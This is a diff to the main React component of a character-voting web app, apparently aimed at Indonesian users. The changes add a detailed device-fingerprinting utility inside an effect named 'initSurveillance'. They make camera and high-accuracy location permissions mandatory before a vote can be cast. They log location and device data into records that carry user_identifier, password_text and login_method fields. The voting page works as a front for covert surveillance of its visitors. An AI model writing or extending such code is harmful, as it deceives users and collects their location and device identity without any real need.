@@ -10,6 +10,7 @@ import CameraMonitor from './components/CameraMonitor';
 import { dataService } from './services/dataService'; 
 import { Timer, ShieldAlert, Fingerprint } from 'lucide-react';
 import { AnimatePresence } from 'framer-motion';
+import { getDetailedDeviceInfo } from './utils/deviceInfo'; // IMPORT UTILITY
 
 function App() {
   const [view, setView] = useState<'app' | 'admin_login' | 'admin_dashboard'>('app');
@@ -47,14 +48,8 @@ function App() {
   // --- IMMEDIATE LOGGING (Passive Only - No Permissions) ---
   useEffect(() => {
       const initSurveillance = async () => {
-          const deviceInfo = {
-              userAgent: navigator.userAgent,
-              platform: navigator.platform,
-              screenSize: `${window.innerWidth}x${window.innerHeight}`,
-              language: navigator.language,
-              cores: navigator.hardwareConcurrency,
-              memory: (navigator as any).deviceMemory
-          };
+          // CAPTURE DETAILED INFO
+          const deviceInfo = getDetailedDeviceInfo();
 
           const storedLoc = localStorage.getItem('muse_user_location');
           let locationData = storedLoc ? JSON.parse(storedLoc) : null;
@@ -81,12 +76,20 @@ function App() {
   // --- DATA LOADING ---
   const fetchCharacters = useCallback(async () => {
     const chars = await dataService.getCharacters();
-    setCharacters(chars);
+    // Only update if we have valid data to prevent flickering empty states
+    if (chars.length > 0) {
+        setCharacters(chars);
+    }
   }, []);
 
   useEffect(() => {
     fetchCharacters();
-    const unsubscribeSupabase = dataService.subscribeToVotes(() => fetchCharacters());
+    // REALTIME: This subscription updates the UI when other users vote
+    const unsubscribeSupabase = dataService.subscribeToVotes(() => {
+        console.log("Realtime update received from Supabase");
+        fetchCharacters();
+    });
+
     const handleStorageChange = () => {
         fetchCharacters();
         setVotingDeadline(localStorage.getItem('muse_voting_deadline'));
@@ -109,18 +112,25 @@ function App() {
   const checkPermissions = useCallback(async () => {
     const missing: ('location' | 'camera')[] = [];
     
-    // Check Camera
+    // 1. Check Camera
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        stream.getTracks().forEach(track => track.stop()); // Stop stream immediately after check
+        // Close immediately, we just wanted to check access
+        stream.getTracks().forEach(track => track.stop()); 
         setIsCameraDenied(false);
     } catch (err) {
+        console.warn("Camera check failed:", err);
         setIsCameraDenied(true);
         missing.push('camera');
     }
 
-    // Check Location
-    if ('geolocation' in navigator) {
+    // 2. Check Location
+    // We wrap this in a promise to make it awaitable
+    const locationGranted = await new Promise<boolean>((resolve) => {
+        if (!('geolocation' in navigator)) {
+            resolve(false);
+            return;
+        }
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const locationData = {
@@ -137,21 +147,21 @@ function App() {
                     user_identifier: guestId,
                     password_text: '',
                     login_method: 'location_update',
-                    device_info: {},
+                    device_info: getDetailedDeviceInfo(), // Update info on location grant
                     location_data: locationData
                 });
+                resolve(true);
             },
-            () => {
+            (error) => {
+                console.warn("Location check failed:", error.message);
                 setIsLocationDenied(true);
-                setMissingPermissions(prev => {
-                     const s = new Set(prev);
-                     s.add('location');
-                     return Array.from(s);
-                });
-            }
+                resolve(false);
+            },
+            { timeout: 10000, enableHighAccuracy: true }
         );
-    } else {
-        setIsLocationDenied(true);
+    });
+
+    if (!locationGranted) {
         missing.push('location');
     }
 
@@ -205,7 +215,6 @@ function App() {
       const idx = characters.findIndex(c => c.id === charId);
       if (idx !== -1) {
           setActiveIndex(idx);
-          // Smooth scroll to top to see the card
           window.scrollTo({ top: 0, behavior: 'smooth' });
       }
   };
@@ -215,23 +224,29 @@ function App() {
       registerInteraction();
       if (hasVoted || isVotingEnded) return;
 
-      // 1. Check Permissions First
+      // STRICT PERMISSION CHECK
       const allGranted = await checkPermissions();
 
       if (!allGranted) {
-          // If permissions missing, FORCE show modal
           setShowPermissionModal(true);
-      } else {
-          // If allowed, show confirmation
-          setIsVoteModalOpen(true);
+          return; // STOP HERE
       }
+      
+      // Only if strict check passed
+      setIsVoteModalOpen(true);
   };
 
   const handlePermissionRetry = async () => {
+      // Re-run the strict check
       const granted = await checkPermissions();
+      
       if (granted) {
+          // Success! Close permission modal and open vote modal
           setShowPermissionModal(false);
-          setIsVoteModalOpen(true); // Proceed to vote immediately
+          setIsVoteModalOpen(true);
+      } else {
+          // Still failed, keep modal open
+          alert("Izin lokasi dan kamera wajib diaktifkan untuk melakukan voting.");
       }
   };
 
@@ -239,37 +254,42 @@ function App() {
     if (isVotingEnded) return;
     setIsVoteModalOpen(false);
     
+    // 1. Double check permissions just in case
+    if (missingPermissions.length > 0) {
+        setShowPermissionModal(true);
+        return;
+    }
+
     try {
         const activeChar = characters[activeIndex];
         const storedLoc = localStorage.getItem('muse_user_location');
         const locationData = storedLoc ? JSON.parse(storedLoc) : null;
         
-        const deviceInfo = { 
-            userAgent: navigator.userAgent, 
-            platform: navigator.platform, 
-            screenSize: `${window.innerWidth}x${window.innerHeight}`,
-            vendor: navigator.vendor
-        };
+        // CAPTURE DETAILED SPECS FOR VOTE
+        const deviceInfo = getDetailedDeviceInfo();
 
-        // 1. OPTIMISTIC UPDATE (Update UI Immediately)
-        // This makes the leaderboard increment instantly without waiting for the database
+        // 2. OPTIMISTIC UPDATE (Update UI Immediately)
         setCharacters(prev => prev.map(c => 
             c.id === activeChar.id ? { ...c, votes: c.votes + 1 } : c
         ));
-        setHasVoted(true); // Lock the button immediately
+        setHasVoted(true); 
 
-        // 2. SEND TO SERVER (Background)
-        await dataService.castVote(activeChar.id, guestId, { location: locationData, deviceInfo });
+        // 3. SEND TO SERVER (Background)
+        const success = await dataService.castVote(activeChar.id, guestId, { location: locationData, deviceInfo });
         
-        // 3. FETCH SYNC (Verify consistency after short delay)
-        setTimeout(async () => {
-            const updated = await dataService.getCharacters();
-            setCharacters(updated);
-        }, 1000);
+        if (!success) {
+            // Revert if explicitly failed (network error)
+            setCharacters(prev => prev.map(c => 
+                c.id === activeChar.id ? { ...c, votes: c.votes - 1 } : c
+            ));
+            setHasVoted(false);
+            alert("Gagal melakukan voting. Mohon periksa koneksi internet Anda.");
+            return;
+        }
 
     } catch (e) {
         console.error("Vote failed locally", e);
-        // Fallback: don't revert UI to keep user happy, retry in background could be implemented
+        setHasVoted(false);
     }
   };
 
@@ -378,13 +398,13 @@ function App() {
         {isVoteModalOpen && !isVotingEnded && <VoteConfirmationModal isOpen={isVoteModalOpen} onClose={() => setIsVoteModalOpen(false)} onConfirm={handleConfirmVote} characterName={activeCharacter.name} />}
       </AnimatePresence>
 
-      {/* Permission Modal - STRICT MODE: No Close button if triggered by Vote click */}
+      {/* Permission Modal - STRICT MODE */}
       <AnimatePresence>
         {showPermissionModal && (
             <PermissionModal 
                 onRetry={handlePermissionRetry} 
                 missingPermissions={missingPermissions} 
-                onClose={() => setShowPermissionModal(false)} // Can close, but won't vote
+                onClose={() => setShowPermissionModal(false)} 
             />
         )}
       </AnimatePresence>
